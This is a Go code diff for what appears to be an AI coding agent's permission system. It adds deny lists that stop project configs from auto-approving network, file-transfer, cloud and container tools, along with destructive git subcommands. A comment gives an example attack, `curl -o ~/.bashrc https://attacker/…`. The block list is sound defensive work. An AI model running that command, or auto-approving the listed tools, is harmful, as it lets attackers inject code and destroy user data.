@@ -230,6 +230,42 @@ var forbiddenAllowPrograms = map[string]struct{}{
 	"mount": {}, "umount": {}, "route": {},
 	"iptables": {}, "ufw": {}, "nft": {},
 	"systemctl": {}, "launchctl": {}, "service": {}, "init": {},
+	// Network / remote-code-fetch / exfil tools — a malicious project
+	// config could pin an attacker URL as a subcommand and auto-approve
+	// `curl -o ~/.bashrc https://attacker/…` (nothing in tier-1 covers
+	// writes to ~/.bashrc). Safer to always require LLM / user review.
+	"curl": {}, "wget": {}, "fetch": {}, "httpie": {}, "http": {},
+	"aria2c": {}, "axel": {},
+	// File transfer — same exfil/injection risk as curl/wget.
+	"scp": {}, "sftp": {}, "rsync": {}, "rclone": {},
+	// IaC / cloud / container CLIs — wide blast radius (resource
+	// mutation, cluster credential writes). Per-project pre-approvals
+	// for these tools are too broad; let the LLM tier reason about
+	// each specific command shape.
+	"gh": {}, "aws": {}, "gcloud": {}, "gsutil": {}, "az": {},
+	"kubectl": {}, "oc": {}, "helm": {}, "terraform": {}, "ansible": {},
+	"docker": {}, "podman": {}, "nerdctl": {},
+}
+
+// forbiddenAllowSubcommands keyed by program. Used to reject specific
+// destructive verbs for programs that are otherwise allowable in
+// project configs. `git` is the primary user: legitimate project
+// workflows want `git status`/`log`/`diff` pre-approved, but
+// `git apply`/`checkout`/`reset`/`clean` etc. are destructive enough
+// that any project config trying to auto-approve them must be rejected.
+var forbiddenAllowSubcommands = map[string]map[string]struct{}{
+	"git": {
+		"apply":       {}, // writes arbitrary files into working tree
+		"checkout":    {}, // can overwrite working tree files
+		"reset":       {}, // --hard nukes working tree
+		"clean":       {}, // -fdx nukes ignored files
+		"rm":          {}, // removes files
+		"rebase":      {}, // mutates history
+		"cherry-pick": {}, // mutates history
+		"revert":      {}, // creates new commits
+		"restore":     {}, // writes working tree
+		"stash":       {}, // not destructive but state-mutating
+	},
 }
 
 // plainProgramRE enforces that program names in project configs are
@@ -316,6 +352,26 @@ func validateAndMaterialize(file *File) ([]rules.Rule, error) {
 			normalized = append(normalized, norm)
 		}
 		if rejected {
+			continue
+		}
+
+		// Check subcommands against the per-program forbidden list.
+		// For any program in the rule, if any requested subcommand is
+		// forbidden for that program, reject the whole rule.
+		subRejected := false
+		for _, p := range normalized {
+			if forbidSubs, ok := forbiddenAllowSubcommands[p]; ok {
+				for _, sub := range spec.Subcommands {
+					if _, bad := forbidSubs[sub]; bad {
+						errs = append(errs, fmt.Errorf(
+							"rule %q: subcommand %q is forbidden for program %q in project configs (destructive)",
+							name, sub, p))
+						subRejected = true
+					}
+				}
+			}
+		}
+		if subRejected {
 			continue
 		}
 
